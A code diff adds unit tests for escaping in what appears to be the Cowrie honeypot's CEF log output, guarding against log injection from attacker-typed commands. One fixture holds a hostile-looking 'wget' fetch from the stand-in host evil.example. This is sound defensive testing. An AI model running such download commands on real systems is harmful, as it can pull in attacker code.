@@ -61,5 +61,43 @@ class CefFormatTests(unittest.TestCase):
         self.assertIn("filePath=var/lib/cowrie/downloads/def456", cef)
 
 
+class CefExtensionEscapingTests(unittest.TestCase):
+    """An extension value carries attacker-influenced text (a typed command).
+    CEF delimits pairs with a space and a key from its value with "=", so a
+    literal "=" or "\\" in a value has to be escaped or the reader sees extra
+    key/value pairs instead of the text."""
+
+    def test_equals_in_message_is_escaped(self) -> None:
+        cef = formatCef(
+            _entry(
+                eventid="cowrie.command.input",
+                message="CMD: wget http://evil.example/x?a=b&c=d",
+            )
+        )
+
+        self.assertIn(r"msg=CMD: wget http://evil.example/x?a\=b&c\=d", cef)
+
+    def test_backslash_in_message_is_escaped(self) -> None:
+        cef = formatCef(
+            _entry(eventid="cowrie.command.input", message=r"CMD: echo a\b")
+        )
+
+        self.assertIn(r"msg=CMD: echo a\\b", cef)
+
+    def test_newline_in_message_is_escaped(self) -> None:
+        """A raw newline would end the syslog record mid-event."""
+        cef = formatCef(
+            _entry(eventid="cowrie.command.input", message="first\r\nsecond")
+        )
+
+        self.assertIn(r"msg=first\r\nsecond", cef)
+        self.assertNotIn("\n", cef)
+
+    def test_ordinary_value_is_unchanged(self) -> None:
+        cef = formatCef(_entry(eventid="cowrie.command.input", message="CMD: ls -la"))
+
+        self.assertIn("msg=CMD: ls -la", cef)
+
+
 if __name__ == "__main__":
     unittest.main()
